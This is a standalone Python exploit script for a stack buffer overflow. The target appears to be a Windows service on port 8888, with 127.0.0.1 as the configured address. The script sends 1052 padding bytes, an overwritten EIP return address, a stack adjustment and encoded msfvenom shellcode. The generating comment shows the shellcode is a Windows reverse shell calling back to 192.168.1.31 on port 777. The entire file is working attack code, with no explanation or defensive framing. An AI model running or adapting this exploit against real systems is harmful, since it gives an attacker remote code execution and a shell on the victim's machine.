#!/usr/bin/python3

import socket, signal, sys

def def_handler(sig, frame):
	print("\n\n Exit...\n")
	sys.exit(1)

#ctrl + c
signal.signal(signal.SIGINT, def_handler)

#Globar variables

ip_address = "127.0.0.1"
offset = 1052
junk = b"A"*offset
eip = b"\x7b\x8a\xa9\x68" #0x68a98a7b
sub_esp = b"\x83\xEC\x10" #sub esp, 0x10

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.31 LPORT=777 --platform windows -a x86 -e x86/shikata_ga_nai -v shellcode -f python EXITFUNC=thread
shellcode =  b""
shellcode += b"\xdb\xd0\xd9\x74\x24\xf4\x5b\xb8\xa1\x11\x0f"
shellcode += b"\x18\x29\xc9\xb1\x52\x31\x43\x17\x03\x43\x17"
shellcode += b"\x83\x62\x15\xed\xed\x98\xfe\x73\x0d\x60\xff"
shellcode += b"\x13\x87\x85\xce\x13\xf3\xce\x61\xa4\x77\x82"
shellcode += b"\x8d\x4f\xd5\x36\x05\x3d\xf2\x39\xae\x88\x24"
shellcode += b"\x74\x2f\xa0\x15\x17\xb3\xbb\x49\xf7\x8a\x73"
shellcode += b"\x9c\xf6\xcb\x6e\x6d\xaa\x84\xe5\xc0\x5a\xa0"
shellcode += b"\xb0\xd8\xd1\xfa\x55\x59\x06\x4a\x57\x48\x99"
shellcode += b"\xc0\x0e\x4a\x18\x04\x3b\xc3\x02\x49\x06\x9d"
shellcode += b"\xb9\xb9\xfc\x1c\x6b\xf0\xfd\xb3\x52\x3c\x0c"
shellcode += b"\xcd\x93\xfb\xef\xb8\xed\xff\x92\xba\x2a\x7d"
shellcode += b"\x49\x4e\xa8\x25\x1a\xe8\x14\xd7\xcf\x6f\xdf"
shellcode += b"\xdb\xa4\xe4\x87\xff\x3b\x28\xbc\x04\xb7\xcf"
shellcode += b"\x12\x8d\x83\xeb\xb6\xd5\x50\x95\xef\xb3\x37"
shellcode += b"\xaa\xef\x1b\xe7\x0e\x64\xb1\xfc\x22\x27\xde"
shellcode += b"\x31\x0f\xd7\x1e\x5e\x18\xa4\x2c\xc1\xb2\x22"
shellcode += b"\x1d\x8a\x1c\xb5\x62\xa1\xd9\x29\x9d\x4a\x1a"
shellcode += b"\x60\x5a\x1e\x4a\x1a\x4b\x1f\x01\xda\x74\xca"
shellcode += b"\x86\x8a\xda\xa5\x66\x7a\x9b\x15\x0f\x90\x14"
shellcode += b"\x49\x2f\x9b\xfe\xe2\xda\x66\x69\xcd\xb3\x69"
shellcode += b"\x76\xa5\xc1\x69\x8b\x3c\x4f\x8f\xe1\x2e\x19"
shellcode += b"\x18\x9e\xd7\x00\xd2\x3f\x17\x9f\x9f\x00\x93"
shellcode += b"\x2c\x60\xce\x54\x58\x72\xa7\x94\x17\x28\x6e"
shellcode += b"\xaa\x8d\x44\xec\x39\x4a\x94\x7b\x22\xc5\xc3"
shellcode += b"\x2c\x94\x1c\x81\xc0\x8f\xb6\xb7\x18\x49\xf0"
shellcode += b"\x73\xc7\xaa\xff\x7a\x8a\x97\xdb\x6c\x52\x17"
shellcode += b"\x60\xd8\x0a\x4e\x3e\xb6\xec\x38\xf0\x60\xa7"
shellcode += b"\x97\x5a\xe4\x3e\xd4\x5c\x72\x3f\x31\x2b\x9a"
shellcode += b"\x8e\xec\x6a\xa5\x3f\x79\x7b\xde\x5d\x19\x84"
shellcode += b"\x35\xe6\x39\x67\x9f\x13\xd2\x3e\x4a\x9e\xbf"
shellcode += b"\xc0\xa1\xdd\xb9\x42\x43\x9e\x3d\x5a\x26\x9b"
shellcode += b"\x7a\xdc\xdb\xd1\x13\x89\xdb\x46\x13\x98"
payload = junk + eip + sub_esp + shellcode

def makeConnection():

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip_address,8888))
	s.send(payload)

if __name__ == '__main__':
	makeConnection()
